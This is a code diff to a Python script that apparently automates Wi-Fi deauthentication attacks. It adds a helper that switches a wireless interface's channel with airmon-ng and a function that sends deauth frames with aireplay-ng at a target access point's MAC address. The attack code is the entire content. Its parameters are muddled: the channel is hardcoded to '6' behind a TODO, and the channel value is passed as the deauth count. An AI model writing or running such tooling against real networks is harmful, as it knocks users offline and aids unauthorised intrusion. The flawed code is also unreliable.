@@ -1,17 +1,35 @@
 import argparse
 import logging
+import threading
 import subprocess
+import tempfile
 import time
 import os
 import re
+import signal
 from pathlib import Path
 from typing import Optional
 import pty
 import select
+import sys
 from typing import Optional, Dict, Any
 
-def send_deauths(iface: str, mac_address: str, channel: str): 
-    print('Inside send_deauths')
+def put_interface_in_same_channel(iface: str, channel: str):
+    channel_message = "Putting interface in channel {channel}".format(channel = channel)
+    print(channel_message)
+
+    cmd = ["sudo", "airmon-ng", "stop", iface]
+    iface_down_output = subprocess.run(cmd, capture_output=True, text=True)
+    print(iface_down_output.stdout)
+
+    cmd = ["sudo", "airmon-ng", "start", iface, channel]
+    iface_up_output = subprocess.run(cmd, capture_output=True, text=True)
+    print(iface_up_output.stdout)
+
+def send_deauths(iface: str, mac_address: str, channel: str):
+    # TODO: figure out how to get the channel to pass to this function
+    put_interface_in_same_channel(iface, "6")
+    
     cmd = ["sudo", "aireplay-ng", "--deauth", channel, "-a", mac_address, iface]
     result = subprocess.run(cmd, capture_output=True, text=True)
     print(result.stdout)
